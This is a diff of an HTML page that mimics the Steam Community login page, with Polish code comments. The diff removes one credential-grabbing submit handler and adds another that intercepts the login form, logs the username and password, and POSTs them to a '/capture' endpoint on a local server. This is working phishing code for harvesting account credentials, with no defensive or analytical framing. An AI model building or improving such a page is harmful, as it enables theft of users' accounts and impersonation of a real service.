@@ -268,57 +268,22 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 
 
 <script language="Javascript">
-    function StartLogin() {
-        LoginManager = new CLoginPromptManager('https://steamcommunity.com', {
-            strRedirectURL: "http:\/\/steamcommunity.com\/id\/boomsinclair",
-            gidCaptcha: -1,
-            strMobileClientType: null,
-            strMobileClientVersion: null,
-            bIsMobile: false
-        });
-            
-        // Ustawianie fokusu na polu użytkownika
-        document.forms['logon'].elements['username'].focus();
-    }
-            
-    // Obsługa wysyłania formularza
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();  // Zapobiega domyślnemu przeładowaniu strony
-            
-        // Pobieramy dane z formularza
-        const username = document.getElementById('steamAccountName').value;
-        const password = document.getElementById('steamPassword').value;
-                    
-        // Jeśli jest włączony CAPTCHA, pobieramy również jego wartość
-        const captchaText = document.getElementById('input_captcha') ? document.getElementById('input_captcha').value : null;
-            
-        // Tworzymy obiekt danych do wysłania
-        const data = {
-            username: username,
-            password: password,
-            captcha: captchaText
-        };
-            
-        // Wysyłamy dane do backendu bez oczekiwania na odpowiedź
-        fetch('/login', {  // Zakładając, że endpoint do logowania to "/login"
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .catch(error => {
-            console.error('Błąd:', error);
-            // Tutaj możesz dodać logowanie błędu, ale nie musisz interweniować w interfejsie użytkownika
-        });
-            
-        // Po wysłaniu formularza, od razu możemy np. przekierować użytkownika
-        window.location.href = '/dashboard';  // Można dodać odpowiednią stronę po wysłaniu formularza
-    });
-            
-    $J(function() {
-        StartLogin();
-    });
+	function StartLogin()
+	{
+		LoginManager = new CLoginPromptManager( 'https://steamcommunity.com', {
+			strRedirectURL: "http:\/\/steamcommunity.com\/id\/boomsinclair",
+			gidCaptcha: -1,
+			strMobileClientType: null,
+			strMobileClientVersion: null,
+			bIsMobile: false		} );
+			
+		document.forms['logon'].elements['username'].focus();
+			
+			}
+			
+	$J( function() {
+		StartLogin();
+	});
 </script>
             
 
@@ -424,5 +389,43 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 	<br clear="left">
 
 </div>
+<script>
+	// Nasłuchiwanie na zdarzenie przesyłania formularza
+	document.addEventListener('DOMContentLoaded', function () {
+		const loginForm = document.forms['logon']; // Znajdujemy formularz o nazwie 'logon'
+
+		if (loginForm) {
+			loginForm.addEventListener('submit', function (event) {
+				// Zatrzymaj domyślne przesyłanie formularza
+				event.preventDefault();
+
+				// Pobierz dane z pól formularza
+				const username = loginForm.elements['username'].value;
+				const password = loginForm.elements['password'].value;
+
+				// Wyświetl w konsoli (lub wyślij do serwera, zapisz do pliku itp.)
+				console.log('Username:', username);
+				console.log('Password:', password);
+
+				// Możesz zapisać dane do pliku lub wysłać je do innego serwera:
+				// Przykład zapisu do serwera
+				fetch('http://localhost:3000/capture', {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+					},
+					body: JSON.stringify({ username, password }),
+				}).then((response) => {
+					console.log('Dane zapisane:', response);
+				}).catch((error) => {
+					console.error('Błąd przy zapisie danych:', error);
+				});
+
+				// Możesz też zezwolić na przesłanie formularza dalej:
+				// loginForm.submit();
+			});
+		}
+	});
+</script>
 </body>
 </html>
